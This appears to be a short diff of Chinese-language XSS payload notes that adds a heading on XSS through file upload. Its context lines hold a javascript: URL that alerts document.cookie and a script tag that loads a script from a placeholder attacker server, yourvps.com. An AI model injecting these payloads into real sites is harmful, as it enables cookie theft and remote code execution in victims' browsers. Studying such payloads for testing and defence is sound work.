@@ -157,3 +157,6 @@ location: //x:1/://dev.twitter.com/javascript:alert(document.cookie)
 ```
 <script>$.getScript("https://yourvps.com/xss.js")</script>
 ```
+
+# 14，通过文件上传进行xss
+![[Pasted image 20241023223521.png]]
